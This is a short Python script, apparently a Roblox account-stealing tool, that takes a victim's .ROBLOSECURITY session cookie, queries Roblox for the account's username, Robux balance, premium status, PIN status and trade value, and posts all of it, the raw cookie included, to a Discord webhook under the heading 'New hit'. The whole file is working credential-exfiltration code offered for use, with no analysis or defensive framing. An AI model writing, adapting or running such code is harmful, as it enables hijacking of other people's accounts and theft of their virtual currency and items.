import json, robloxpy, requests
webhook = ''
cookie = ''
# cookie = input('cookie : ') 
# webhook = input('webhook: ')
# use these if u dont want to put them in the file instead

pin = requests.get("https://auth.roblox.com/v1/account/pin",cookies={".ROBLOSECURITY":cookie})
strr = json.loads(pin.text)
pin = strr["isEnabled"]

r = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":cookie})
str = json.loads(r.text)

id = str["UserID"]
username = str['UserName']
robux = str['RobuxBalance']
p = str['IsPremium']

profile = f"https://web.roblox.com/users/{id}/profile"
rolimons = f"https://www.rolimons.com/player/{id}"

headshot = robloxpy.User.External.GetHeadshot(id)
rap = robloxpy.User.External.GetRAP(id)

info = {
  "content": '',
  "embeds": [
    {
      "title": "New hit | https://discord.gg/2u8Gv3T4w4",
      "color": 1341395,
      "fields": [
        {
          "name": "Username",
          "value": f"{username}",
          "inline": True
        },
        {
          "name": "Robux",
          "value": f"{robux}",
          "inline": True
        },
        {
          "name": "Premium?",
          "value": f"{p}",
          "inline": True
        },
        {
          "name": "RAP",
          "value": f"{rap}",
          "inline": True
        },
        {
          "name": "PIN?",
          "value": f"{pin}",
          "inline": True
        },
        {
          "name": "INFO",
          "value": f"[Rolimons](https://www.rolimons.com/player/{id}) | [Roblox](https://www.roblox.com/users/{id})",
          "inline": True
        },
        {
          "name": ".ROBLOSECURITY",
          "value": f"```fix\n{cookie}\n```"
        }
      ],
      "footer": {
        "text": "scooby#0001 made this shi"
      },
      "thumbnail": {
        "url": f"{headshot}"
      }
    }
  ],
  "username": "Angel",
  "avatar_url": "https://cdn.discordapp.com/attachments/818904708940693513/998008481393156096/7d3e8a23aa14956289350fbac8600754.jpg",
  "attachments": []
}
requests.post(webhook, json=info)